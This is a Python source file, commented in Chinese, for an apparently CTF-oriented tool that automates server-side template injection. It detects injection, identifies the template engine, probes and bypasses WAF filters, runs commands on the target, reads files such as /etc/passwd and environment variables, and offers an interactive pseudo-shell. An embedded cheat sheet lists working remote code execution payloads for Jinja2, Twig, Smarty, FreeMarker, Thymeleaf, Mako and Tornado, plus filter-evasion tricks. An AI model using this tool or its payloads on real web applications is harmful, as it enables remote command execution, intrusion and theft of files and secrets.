#!/usr/bin/env python3
"""
CTF SSTI 模板注入自动化检测与利用工具 (web_ssti_toolkit.py)
=============================================================
完整流程: 检测 → 引擎识别 → 攻击面探测 → WAF 探测与绕过 → 命令执行/伪shell

功能模块:
  1. 检测:   注入数学表达式确认 SSTI 存在
  2. 识别:   差异化 payload 确定模板引擎类型
  3. 探测:   config 泄漏、可用全局对象、__subclasses__ 定位
  4. WAF:    字符级过滤探测，自动生成绕过方案
  5. 利用:   多链自动尝试 RCE / 文件读取 / 信息收集
  6. 伪shell: 逐条执行命令，模拟交互式 shell 体验
  7. 单命令: 一次性执行命令并返回输出

支持的模板引擎:
  - Jinja2 (Flask / Django 模板)
  - Twig (Symfony / PHP)
  - Smarty (PHP)
  - FreeMarker (Java / Spring)
  - Velocity (Java / Apache)
  - Thymeleaf (Java / Spring Boot)
  - Mako (Python)
  - Tornado (Python)

架构: 多引擎模块化设计，各引擎独立文件位于 ssti_engines/ 包
核心依赖: requests

使用方式:
  # 全自动: 检测+识别+探测+利用
  python web_ssti_toolkit.py -u "http://target/?name=test" --param name

  # 指定引擎并执行单条命令
  python web_ssti_toolkit.py -u "http://target/?name=test" --param name --engine jinja2 --exec "id"

  # 进入伪 shell 模式
  python web_ssti_toolkit.py -u "http://target/?name=test" --param name --engine jinja2 --shell

  # 读取文件
  python web_ssti_toolkit.py -u "http://target/?name=test" --param name --engine jinja2 --read /etc/passwd

  # WAF 探测
  python web_ssti_toolkit.py -u "http://target/?name=test" --param name --engine jinja2 --waf

  # POST 方式
  python web_ssti_toolkit.py -u "http://target/" --param name --method POST --data "name=test"

比赛时替换 URL 和参数名即可。
"""

import argparse
import sys
import re
import urllib.parse

try:
    import requests
except ImportError:
    print("[!] 需要安装 requests: pip install requests")
    sys.exit(1)

# 多引擎模块
from ssti_engines import (
    ENGINE_REGISTRY, DETECT_PAYLOADS, ENGINE_FINGERPRINTS,
    SUPPORTED_ENGINES, get_engine,
)
from ssti_engines.utils import clean_response, is_waf_blocked


# ============================================================
# 核心工具类
# ============================================================

class SSTIToolkit:
    """SSTI 检测、识别、WAF 探测、绕过、利用一体化工具"""

    def __init__(self, url, param, method='GET', data=None,
                 cookies=None, headers=None, timeout=10, proxy=None,
                 extra_params=None):
        self.url = url
        self.param = param
        self.method = method.upper()
        self.data = data or {}
        self.timeout = timeout
        self.extra_params = extra_params or {}
        self.engine = None          # 引擎名 (字符串)
        self.engine_obj = None      # 引擎实例 (BaseEngine 子类)
        self.waf_filters = set()    # 探测到的过滤字符
        self.working_chain = None   # 验证可用的 RCE 链 (字符串或特殊标记)
        self.working_bypass = None  # 验证可用的绕过策略
        self.filtered_keywords = set()  # 探测到的被过滤关键字
        self.baseline_text = None   # 基准响应文本

        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        })
        if cookies:
            self.session.headers['Cookie'] = cookies
        if headers:
            self.session.headers.update(headers)
        if proxy:
            self.session.proxies = {'http': proxy, 'https': proxy}

    def _ensure_engine_obj(self):
        """根据 self.engine 创建引擎实例"""
        if self.engine and self.engine_obj is None:
            self.engine_obj = get_engine(self.engine)

    # --------------------------------------------------------
    # HTTP 请求层
    # --------------------------------------------------------

    def _get_baseline(self):
        """获取基准响应（发送无危害的纯文本 payload），用于后续输出清洗"""
        if self.baseline_text is not None:
            return self.baseline_text
        text = self.send_and_clean('ssti_baseline_noop')
        self.baseline_text = text or ''
        return self.baseline_text

    def _extract_output(self, text):
        """从响应中提取 RCE 输出，去除模板壳"""
        if not text:
            return ''
        baseline = self._get_baseline()
        if not baseline:
            return text.strip()

        if baseline in text:
            return text.replace(baseline, '').strip()

        placeholder = 'ssti_baseline_noop'
        if placeholder not in baseline:
            return text.strip()

        idx = baseline.index(placeholder)
        prefix = baseline[:idx]
        suffix = baseline[idx + len(placeholder):]

        if prefix and prefix in text:
            start = text.index(prefix) + len(prefix)
        else:
            start = 0

        if suffix and suffix in text:
            end = text.index(suffix, start)
        else:
            end = len(text)

        return text[start:end].strip()

    def send_payload(self, payload, extra_params=None):
        """发送 SSTI payload 并返回响应文本"""
        params = {}
        data = {}

        data.update(self.data)

        ep = {**self.extra_params, **(extra_params or {})}
        for k, v in ep.items():
            data[k] = v

        if self.method == 'GET':
            params[self.param] = payload
            for k, v in data.items():
                params[k] = v
        else:
            data[self.param] = payload

        try:
            if self.method == 'GET':
                resp = self.session.get(self.url, params=params, timeout=self.timeout)
            else:
                resp = self.session.post(self.url, data=data, timeout=self.timeout)
            return resp.text
        except requests.RequestException as e:
            print(f"[!] 请求失败: {e}")
            return None

    def send_and_clean(self, payload, extra_params=None):
        """发送 payload 并返回清洗后的文本"""
        text = self.send_payload(payload, extra_params)
        return clean_response(text, payload) if text else ''

    # --------------------------------------------------------
    # Phase 1: 检测与引擎识别
    # --------------------------------------------------------

    def detect(self):
        """检测是否存在 SSTI，返回候选引擎集合"""
        print("\n" + "=" * 60)
        print("[Phase 1] SSTI 检测")
        print("=" * 60)

        detected_engines = set()

        for item in DETECT_PAYLOADS:
            payload = item['payload']
            expected = item['expected']
            print(f"  [*] 测试: {payload}")
            text = self.send_and_clean(payload)
            if expected in text:
                engines = item.get('engines', [])
                print(f"  [+] 命中: {payload} → {expected}  候选引擎: {engines}")
                for e in engines:
                    detected_engines.add(e)

        if not detected_engines:
            print("[-] 未检测到 SSTI")
            return None

        return detected_engines

    def identify_engine(self, candidates):
        """精确识别模板引擎，返回引擎名"""
        print(f"\n[*] 进一步识别引擎 (候选: {candidates})...")

        confirmed = None
        for engine in candidates:
            fingerprints = ENGINE_FINGERPRINTS.get(engine, [])
            if not fingerprints:
                continue

            score = 0
            for fp in fingerprints:
                text = self.send_and_clean(fp['payload'])
                if fp['expected'] and fp['expected'] in text:
                    score += 1
                    print(f"  [+] {engine}: {fp['desc']} → 命中")

            if score > 0:
                confirmed = engine
                break

        if not confirmed:
            confirmed = list(candidates)[0] if candidates else None
            print(f"  [?] 无法精确识别，默认使用: {confirmed}")

        if confirmed:
            self.engine = confirmed
            self._ensure_engine_obj()
            print(f"\n[+] 确认模板引擎: {confirmed}")

        return confirmed

    # --------------------------------------------------------
    # Phase 2: 攻击面探测
    # --------------------------------------------------------

    def probe_attack_surface(self):
        """探测可用攻击面 (委托给引擎实例)"""
        print("\n" + "=" * 60)
        print("[Phase 2] 攻击面探测")
        print("=" * 60)

        self._ensure_engine_obj()
        if hasattr(self.engine_obj, 'probe_attack_surface'):
            self.engine_obj.probe_attack_surface(self)
        else:
            print(f"  [*] 引擎 {self.engine} — 跳过详细探测")
            print(f"  [*] 可直接尝试 --exec / --read / --shell")

    # --------------------------------------------------------
    # Phase 3: WAF 探测与绕过
    # --------------------------------------------------------

    def detect_waf(self):
        """WAF 字符级+关键字级过滤探测 (委托给引擎实例)"""
        print("\n" + "=" * 60)
        print("[Phase 3] WAF 过滤探测")
        print("=" * 60)

        self._ensure_engine_obj()
        filters, filtered_keywords = self.engine_obj.probe_waf(self)

        if filters:
            print(f"\n  [!] 探测到过滤: {filters}")
        else:
            print(f"\n  [+] 未探测到明显过滤")

        if filtered_keywords:
            print(f"  [!] 被过滤关键字: {filtered_keywords}")

        self.waf_filters = filters
        self.filtered_keywords = filtered_keywords
        # 同步到引擎实例
        self.engine_obj.waf_filters = filters
        self.engine_obj.filtered_keywords = filtered_keywords

        # 选择绕过策略
        self._select_bypass()

        return filters

    def _select_bypass(self):
        """根据过滤字符选择最佳绕过策略 (委托给引擎实例)"""
        print("\n  [*] 匹配绕过策略...")

        strategy = self.engine_obj.select_bypass(self.waf_filters)
        if strategy:
            self.working_bypass = strategy
            if strategy['filters']:
                print(f"  [+] 匹配策略: {strategy['name']}")
            else:
                print(f"  [*] 使用默认策略: {strategy['name']}")
        else:
            print(f"  [-] 无可用绕过策略")
        return strategy

    def _build_rce_payload(self, cmd, bypass=None):
        """构造 RCE payload (委托给引擎实例)"""
        strategy = bypass or self.working_bypass
        if strategy:
            self.engine_obj.waf_filters = self.waf_filters
            self.engine_obj.filtered_keywords = self.filtered_keywords
            # 临时设置 working_bypass 给引擎读取
            old_bypass = getattr(self, 'working_bypass', None)
            if bypass:
                self.working_bypass = bypass
            payload, extra = self.engine_obj.build_rce_payload(cmd, self)
            if bypass:
                self.working_bypass = old_bypass
            return payload, extra
        return self.engine_obj.build_rce_payload(cmd, self)

    def _build_file_payload(self, filepath, bypass=None):
        """构造文件读取 payload (委托给引擎实例)"""
        strategy = bypass or self.working_bypass
        if strategy:
            self.engine_obj.waf_filters = self.waf_filters
            self.engine_obj.filtered_keywords = self.filtered_keywords
            old_bypass = getattr(self, 'working_bypass', None)
            if bypass:
                self.working_bypass = bypass
            payload, extra = self.engine_obj.build_file_payload(filepath, self)
            if bypass:
                self.working_bypass = old_bypass
            return payload, extra
        return self.engine_obj.build_file_payload(filepath, self)

    def _is_rce_output(self, text, cmd):
        """判断响应是否包含有效的 RCE 输出 (委托给引擎实例)"""
        self._ensure_engine_obj()
        return self.engine_obj.is_rce_output(text, cmd, self)

    def _sanitize_cmd_for_space(self, cmd):
        """空格替代 (委托给引擎实例)"""
        self._ensure_engine_obj()
        return self.engine_obj.sanitize_cmd_for_space(cmd, self.waf_filters)

    def _sanitize_cmd_for_keywords(self, cmd):
        """关键字替代 (委托给引擎实例)"""
        self._ensure_engine_obj()
        return self.engine_obj.sanitize_cmd_for_keywords(cmd, self.filtered_keywords)

    # --------------------------------------------------------
    # Phase 4: 命令执行
    # --------------------------------------------------------

    def find_working_chain(self):
        """自动尝试所有利用链，找到第一个可用的"""
        self._ensure_engine_obj()
        engine = self.engine_obj

        chains = engine.rce_chains
        if not chains:
            return None

        print(f"\n[*] 寻找可用 RCE 链 ({len(chains)} 条)...")
        test_cmd = 'id'

        for i, chain in enumerate(chains):
            payload = chain.replace('CMD', test_cmd)
            print(f"  [{i+1}/{len(chains)}] {payload[:80]}...")

            text = self.send_and_clean(payload)
            if text and self._is_rce_output(text, test_cmd):
                print(f"  [+] 命中! 利用链可用")
                self.working_chain = chain
                return chain

        # 常规链失败 → 尝试绕过策略
        if self.waf_filters or engine.bypass_strategies:
            print(f"\n[*] 常规链失败，尝试绕过策略...")
            for strategy in engine.bypass_strategies:
                if not strategy.get('rce'):
                    continue
                # 跳过无过滤策略（已作为常规链尝试）
                if not strategy['filters']:
                    continue
                self.working_bypass = strategy
                engine.waf_filters = self.waf_filters
                engine.filtered_keywords = self.filtered_keywords
                payload, extra = engine.build_rce_payload(test_cmd, self)
                if not payload:
                    continue
                print(f"  [{strategy['name']}] {payload[:80]}...")
                text = self.send_and_clean(payload, extra)
                if text and self._is_rce_output(text, test_cmd):
                    print(f"  [+] 命中! 绕过策略可用: {strategy['name']}")
                    self.working_chain = strategy['rce']
                    self.working_bypass = strategy
                    return self.working_chain

        print("  [-] 所有利用链均未成功")
        return None

    def exec_cmd(self, cmd):
        """执行单条命令，返回清洗后的输出"""
        self._ensure_engine_obj()
        engine = self.engine_obj

        # 命令预处理
        cmd = self._sanitize_cmd_for_keywords(cmd)

        # 优先使用已验证的链
        if self.working_chain:
            engine.waf_filters = self.waf_filters
            engine.filtered_keywords = self.filtered_keywords
            payload, extra = engine.build_rce_payload(cmd, self)
            if payload:
                text = self.send_and_clean(payload, extra)
                if text and self._is_rce_output(text, cmd):
                    return self._extract_output(text)

        # 尝试所有静态链
        for chain in engine.rce_chains:
            if chain == self.working_chain:
                continue
            payload = chain.replace('CMD', cmd)
            text = self.send_and_clean(payload)
            if text and self._is_rce_output(text, cmd):
                self.working_chain = chain
                return self._extract_output(text)

        # 尝试绕过策略
        for strategy in engine.bypass_strategies:
            if not strategy.get('rce'):
                continue
            if not strategy['filters']:
                continue  # 无过滤策略已作为常规链尝试
            self.working_bypass = strategy
            engine.waf_filters = self.waf_filters
            engine.filtered_keywords = self.filtered_keywords
            payload, extra = engine.build_rce_payload(cmd, self)
            if not payload:
                continue
            text = self.send_and_clean(payload, extra)
            if text and self._is_rce_output(text, cmd):
                self.working_chain = strategy['rce']
                self.working_bypass = strategy
                return self._extract_output(text)

        return None

    def read_file(self, filepath):
        """通过 SSTI 读取文件"""
        self._ensure_engine_obj()
        engine = self.engine_obj

        print(f"\n[*] 读取文件: {filepath}")

        # 如果已有可用的 RCE 链，优先尝试 RCE 读文件
        if self.working_chain:
            # 先尝试引擎的文件读取 payload
            engine.waf_filters = self.waf_filters
            engine.filtered_keywords = self.filtered_keywords
            payload, extra = engine.build_file_payload(filepath, self)
            if payload:
                text = self.send_and_clean(payload, extra)
                if text and len(text) > 0 and not is_waf_blocked(text):
                    # 检查是否有模板残留
                    has_residue = False
                    for tag in engine.template_tags:
                        if tag[0] in text:
                            has_residue = True
                            break
                    if not has_residue:
                        output = self._extract_output(text)
                        print(f"[+] 文件内容:")
                        print(output[:1000])
                        return output

            # 降级: 用 RCE 执行 cat/tac 等命令读文件
            safe_cmd = self._sanitize_cmd_for_keywords(f'cat "{filepath}"')
            output = self.exec_cmd(safe_cmd)
            if output and not is_waf_blocked(output) and len(output) > 0:
                print(f"[+] 文件内容 (通过 RCE):")
                print(output[:1000])
                return output

        # 尝试文件读取链
        for chain in engine.file_read_chains:
            payload = chain.replace('FILEPATH', filepath)
            text = self.send_and_clean(payload)
            if text and len(text) > 0 and not is_waf_blocked(text):
                has_residue = False
                for tag in engine.template_tags:
                    if tag[0] in text:
                        has_residue = True
                        break
                if not has_residue:
                    print(f"[+] 文件内容 (前1000字符):")
                    print(self._extract_output(text)[:1000])
                    return text

        print(f"[-] 文件读取失败")
        return None

    def info_gathering(self):
        """信息收集 (委托给引擎实例)"""
        self._ensure_engine_obj()
        self.engine_obj.info_gathering(self)

    # --------------------------------------------------------
    # Phase 5: 伪 Shell 交互模式
    # --------------------------------------------------------

    def shell(self, engine=None):
        """伪 shell 交互模式: 逐条执行命令"""
        if engine:
            self.engine = engine
            self._ensure_engine_obj()

        if not self.engine:
            candidates = self.detect()
            if not candidates:
                print("[-] 未检测到 SSTI，无法进入 shell")
                return
            self.identify_engine(candidates)

        print("\n" + "=" * 60)
        print(f"[伪 Shell] SSTI RCE 交互模式")
        print(f"  引擎: {self.engine}")
        print(f"  目标: {self.url}")
        print(f"  参数: {self.param}")
        print(f"  过滤: {self.waf_filters if self.waf_filters else '无'}")
        print("=" * 60)

        if not self.working_chain:
            chain = self.find_working_chain()
            if not chain:
                print("[-] 未找到可用 RCE 链，无法进入 shell")
                print("[*] 建议: 尝试 --waf 探测过滤，或 --info 信息收集")
                return

        print(f"  利用链: {str(self.working_chain)[:60]}...")
        print(f"\n  输入命令执行，输入 'exit' / 'quit' 退出")
        print(f"  特殊命令: 'shell' 不支持交互式程序（vim/top/ssh 等）")
        print("=" * 60)

        while True:
            try:
                cmd = input("\nSSTI> ").strip()
            except (EOFError, KeyboardInterrupt):
                print("\n[*] 退出 shell")
                break

            if not cmd:
                continue
            if cmd.lower() in ('exit', 'quit', 'q'):
                print("[*] 退出 shell")
                break

            # 快捷命令
            if cmd == 'flag':
                cmd = 'cat /flag 2>/dev/null; cat /flag.txt 2>/dev/null; echo $FLAG; env | grep -i flag'
            elif cmd == 'id':
                pass
            elif cmd == 'ls_flag':
                cmd = 'find / -name "flag*" -type f 2>/dev/null | head -20'
            elif cmd == 'env':
                output = self.exec_cmd('env')
                if output:
                    print(output)
                else:
                    output = self.exec_cmd('cat /proc/self/environ 2>/dev/null | tr "\\0" "\\n"')
                    if output:
                        print(output)
                    else:
                        print("[!] 命令执行失败或无输出")
                continue
            elif cmd == 'source':
                cmd = 'cat app.py 2>/dev/null; cat /app/app.py 2>/dev/null; cat main.py 2>/dev/null'

            output = self.exec_cmd(cmd)
            if output:
                print(output)
            else:
                print("[!] 命令执行失败或无输出")


# ============================================================
# SSTI Payload 速查表
# ============================================================

SSTI_CHEATSHEET = """
============================================================
SSTI 模板注入 Payload 速查表
============================================================

【1. 检测】
  通用检测: {{7*7}} → 49
  Jinja2:   {{7*'7'}} → 7777777 (字符串重复)
  Twig:     {{7*'7'}} → 49
  Smarty:   {7*7} → 49
  Freemarker: ${7*7} → 49
  Velocity: #set($a=7*7)$a → 49
  Thymeleaf: __${7*7}__ → 49
  Mako:     ${7*7} → 49
  Tornado:  {{7*7}} → 49

【2. Jinja2 (Flask) 常用利用链】
  命令执行 (全局函数链，最简洁):
    {{lipsum.__globals__.os.popen("id").read()}}
    {{cycler.__init__.__globals__.os.popen("id").read()}}
    {{joiner.__init__.__globals__.os.popen("id").read()}}
    {{namespace.__init__.__globals__.os.popen("id").read()}}

  命令执行 (builtins 链，可达 eval):
    {{get_flashed_messages.__globals__.__builtins__.__import__("os").popen("id").read()}}
    {{url_for.__globals__.__builtins__.__import__("os").popen("id").read()}}

  命令执行 (config 链):
    {{config.__class__.__init__.__globals__["os"].popen("id").read()}}

  文件读取:
    {{lipsum.__globals__.__builtins__.open("/etc/passwd").read()}}

  信息收集:
    {{config}}
    {{config.items()}}
    {{request.environ}}

【3. WAF 绕过 (Jinja2，14种策略，实测验证)】
  过滤 . (点号):     用 [] 替代
  过滤 _ (下划线):   用 |attr() 替代
  过滤 . + _:        |attr() + 括号
  过滤 . + _ + []:   全 |attr 链
  过滤引号:           request.args 传参法
  过滤关键字:         request.args 全传参
  极端全过滤:         字符拼接法 (batch+dict+~+|attr)
  |join 拼接法:       ['p1','p2']|join 拆分被过滤词 + [] getattr fallback
  |join + \\x5f:     下划线十六进制转义
  |join + Tab:        空格 Tab 替代

【4. 其他引擎利用链】
  Twig 1.x/2.x:
    {{_self.env.registerUndefinedFilterCallback("system")}}{{_self.env.getFilter("id")}}
  Twig 3.x:
    {{["id"]|filter("system")}}
    {{["id"]|map("shell_exec")}}
  Smarty:
    {system("id")}
    {if system("id")}{/if}
  FreeMarker:
    <#assign value="freemarker.template.utility.Execute"?new()>${value("id")}
  Velocity:
    #set($e="e")$e.getClass().forName("java.lang.Runtime")...
  Thymeleaf:
    __${T(java.lang.Runtime).getRuntime().exec("id")}__
  Mako:
    ${__import__("os").popen("id").read()}
  Tornado:
    {% import os %}{{ os.popen("id").read() }}
    {{ handler.settings }}  → cookie_secret

============================================================
"""


# ============================================================
# 命令行入口
# ============================================================

def parse_data(data_str):
    """解析 POST data 字符串为字典"""
    if not data_str:
        return {}
    result = {}
    for pair in data_str.split('&'):
        if '=' in pair:
            k, v = pair.split('=', 1)
            result[k] = v
    return result


def main():
    parser = argparse.ArgumentParser(
        description='CTF SSTI 模板注入自动化检测与利用工具 (多引擎)',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
示例:
  # 全自动检测+利用
  python web_ssti_toolkit.py -u "http://target/?name=test" --param name

  # 指定引擎 + 单命令执行
  python web_ssti_toolkit.py -u "http://target/?name=test" --param name --engine jinja2 --exec "id"

  # 伪 shell 模式
  python web_ssti_toolkit.py -u "http://target/?name=test" --param name --engine jinja2 --shell

  # WAF 探测
  python web_ssti_toolkit.py -u "http://target/?name=test" --param name --engine jinja2 --waf

  # 读取文件
  python web_ssti_toolkit.py -u "http://target/?name=test" --param name --engine jinja2 --read /etc/passwd

  # 信息收集
  python web_ssti_toolkit.py -u "http://target/?name=test" --param name --engine jinja2 --info

  # POST 方式
  python web_ssti_toolkit.py -u "http://target/" --param name --method POST --data "name=test" --shell

  # 查看速查表
  python web_ssti_toolkit.py cheatsheet
        """
    )

    subparsers = parser.add_subparsers(dest='command', help='子命令')

    # scan 子命令
    p_scan = subparsers.add_parser('scan', help='自动检测 SSTI')
    p_scan.add_argument('-u', '--url', required=True, help='目标 URL')
    p_scan.add_argument('--param', required=True, help='注入参数名')
    p_scan.add_argument('--method', default='GET', help='HTTP 方法 (GET/POST)')
    p_scan.add_argument('--data', help='POST 数据 (key=value&key2=value2)')
    p_scan.add_argument('--cookies', help='Cookie 字符串')
    p_scan.add_argument('--timeout', type=int, default=10, help='请求超时 (秒)')
    p_scan.add_argument('--proxy', help='HTTP 代理')

    # exploit 子命令
    p_exp = subparsers.add_parser('exploit', help='利用 SSTI')
    p_exp.add_argument('-u', '--url', required=True, help='目标 URL')
    p_exp.add_argument('--param', required=True, help='注入参数名')
    p_exp.add_argument('--engine', required=True,
                       choices=SUPPORTED_ENGINES,
                       help='模板引擎')
    p_exp.add_argument('--exec', dest='exec_cmd', help='要执行的命令')
    p_exp.add_argument('--read', dest='read_file', help='要读取的文件路径')
    p_exp.add_argument('--info', action='store_true', help='信息收集')
    p_exp.add_argument('--waf', action='store_true', help='WAF 探测')
    p_exp.add_argument('--shell', action='store_true', help='伪 shell 模式')
    p_exp.add_argument('--method', default='GET', help='HTTP 方法 (GET/POST)')
    p_exp.add_argument('--data', help='POST 数据')
    p_exp.add_argument('--cookies', help='Cookie 字符串')
    p_exp.add_argument('--timeout', type=int, default=10, help='请求超时 (秒)')
    p_exp.add_argument('--proxy', help='HTTP 代理')

    # cheatsheet 子命令
    subparsers.add_parser('cheatsheet', help='显示 SSTI Payload 速查表')

    # 默认模式（无子命令时）
    parser.add_argument('-u', '--url', help='目标 URL')
    parser.add_argument('--param', help='注入参数名')
    parser.add_argument('--method', default='GET', help='HTTP 方法')
    parser.add_argument('--data', help='POST 数据')
    parser.add_argument('--cookies', help='Cookie 字符串')
    parser.add_argument('--timeout', type=int, default=10, help='请求超时 (秒)')
    parser.add_argument('--proxy', help='HTTP 代理')
    parser.add_argument('--engine',
                        choices=SUPPORTED_ENGINES,
                        help='指定模板引擎 (跳过检测)')
    parser.add_argument('--exec', dest='exec_cmd', help='要执行的命令')
    parser.add_argument('--read', dest='read_file', help='要读取的文件路径')
    parser.add_argument('--info', action='store_true', help='信息收集')
    parser.add_argument('--waf', action='store_true', help='WAF 探测')
    parser.add_argument('--shell', action='store_true', help='伪 shell 模式')

    args = parser.parse_args()

    if args.command == 'cheatsheet':
        print(SSTI_CHEATSHEET)
        return

    # 统一参数提取
    if args.command in ('scan', 'exploit'):
        url = args.url
        param = args.param
        method = args.method
        data_str = getattr(args, 'data', None)
        cookies = getattr(args, 'cookies', None)
        timeout = getattr(args, 'timeout', 10)
        proxy = getattr(args, 'proxy', None)
    elif args.url:
        url = args.url
        param = args.param
        method = args.method
        data_str = getattr(args, 'data', None)
        cookies = getattr(args, 'cookies', None)
        timeout = getattr(args, 'timeout', 10)
        proxy = getattr(args, 'proxy', None)
        args.command = 'auto'
    else:
        parser.print_help()
        return

    if not url or not param:
        print("[!] 必须提供 --url 和 --param")
        parser.print_help()
        return

    data = parse_data(data_str)

    # 从 URL 中提取已有 query 参数，避免与注入参数冲突
    from urllib.parse import urlparse, parse_qs
    parsed_url = urlparse(url)
    if parsed_url.query:
        existing_params = parse_qs(parsed_url.query, keep_blank_values=True)
        for k, v_list in existing_params.items():
            if k != param:
                for v in v_list:
                    data[k] = v
        url = f"{parsed_url.scheme}://{parsed_url.netloc}{parsed_url.path}"

    # 创建工具实例
    tool = SSTIToolkit(
        url=url,
        param=param,
        method=method,
        data=data,
        cookies=cookies,
        timeout=timeout,
        proxy=proxy,
    )

    # 执行流程
    engine = getattr(args, 'engine', None)

    if args.command == 'scan' or (args.command == 'auto' and not engine):
        # Phase 1: 检测
        candidates = tool.detect()
        if not candidates:
            return

        engine = tool.identify_engine(candidates)
        if not engine:
            return

        # Phase 2: 攻击面探测
        tool.probe_attack_surface()

        # Phase 3: WAF 探测
        tool.detect_waf()

        # Phase 4: 查找可用链
        tool.find_working_chain()

        # 如果有具体操作请求
        if getattr(args, 'exec_cmd', None):
            output = tool.exec_cmd(args.exec_cmd)
            if output:
                print(f"\n[+] 命令输出:")
                print(output)
        elif getattr(args, 'read_file', None):
            tool.read_file(args.read_file)
        elif getattr(args, 'info', False):
            tool.info_gathering()
        elif getattr(args, 'shell', False):
            tool.shell()
        else:
            print("\n[*] 自动模式完成，输入 --shell 可进入伪 shell")
            print("[*] 或使用 --exec / --read / --info 执行具体操作")

    elif args.command == 'exploit' or (args.command == 'auto' and engine):
        tool.engine = engine
        tool._ensure_engine_obj()

        # WAF 探测（自动或手动）
        tool.detect_waf()

        # 查找可用链
        tool.find_working_chain()

        if getattr(args, 'shell', False):
            tool.shell()
        elif getattr(args, 'exec_cmd', None):
            output = tool.exec_cmd(args.exec_cmd)
            if output:
                print(f"\n[+] 命令输出:")
                print(output)
            else:
                print(f"\n[-] 命令执行失败")
                print(f"[*] 建议: 尝试 --waf 探测过滤规则")
        elif getattr(args, 'read_file', None):
            tool.read_file(args.read_file)
        elif getattr(args, 'info', False):
            tool.info_gathering()
        elif getattr(args, 'waf', False):
            pass  # WAF 探测已完成
        else:
            # 无具体操作，先信息收集
            tool.info_gathering()
            print(f"\n[*] 使用 --shell / --exec / --read / --waf 执行具体操作")


if __name__ == '__main__':
    main()
